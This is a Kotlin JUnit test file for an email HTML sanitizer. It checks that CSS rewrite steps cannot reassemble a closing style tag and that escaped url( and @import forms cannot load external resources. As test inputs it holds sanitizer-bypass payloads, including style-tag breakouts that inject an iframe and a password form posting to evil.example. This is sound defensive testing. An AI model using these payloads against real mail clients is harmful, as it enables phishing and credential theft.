package org.kysecurity.mail

import org.jsoup.Jsoup
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Test

/** A CSS rewrite (comment, `@import`, escape or `!important` strip) must never assemble a
 *  `</style>` inside style text: the text is written back raw, and everything after it would
 *  reach the WebView as live markup the sanitizer never saw. */
class StyleRewriteInjectionTest {

    private fun liveTags(html: String, tag: String) = Jsoup.parseBodyFragment(html).select(tag).size

    private fun assertNoInjection(payload: String) {
        val once = blockExternalResources(payload)
        val dark = stripImportant(once)
        for (out in listOf(once, dark)) {
            assertEquals("iframe in $out", 0, liveTags(out, "iframe"))
            assertEquals("input in $out", 0, liveTags(out, "input"))
            assertEquals("form in $out", 0, liveTags(out, "form"))
        }
    }

    private val tail = "<iframe srcdoc=x></iframe><form action=https://evil.example method=post>" +
        "<input type=password name=p></form>"

    @Test fun commentStrip() = assertNoInjection("<style></sty/**/le>$tail</style>")

    @Test fun importStrip() = assertNoInjection("<style></@import x;style>$tail</style>")

    @Test fun escapeDecode() = assertNoInjection("<style>\\3c /style>$tail a{background:\\75 rl(https://t.example/p)}</style>")

    @Test fun importantStrip() = assertNoInjection("<style></style!important>$tail</style>")

    /** `u\rl(` is `url(` to a CSS parser: a non-hex escape is the character itself. */
    @Test
    fun nonHexEscapesCannotHideAResource() {
        for (css in listOf("u\\rl(https://t.example/p)", "@\\import \"https://t.example/a.css\";")) {
            val out = blockExternalResources("<style>a{background:$css}</style>", keepImages = true)
            assertFalse(out, out.contains("t.example"))
        }
    }

    /** Dark mode strips `!important` after the resource pass; that must not assemble a `url(`. */
    @Test
    fun importantStripCannotAssembleAUrl() {
        val out = stripImportant(blockExternalResources("<style>a{background:url!important(https://t.example/p)}</style>", keepImages = true))
        assertFalse(out, out.contains("t.example"))
    }
}
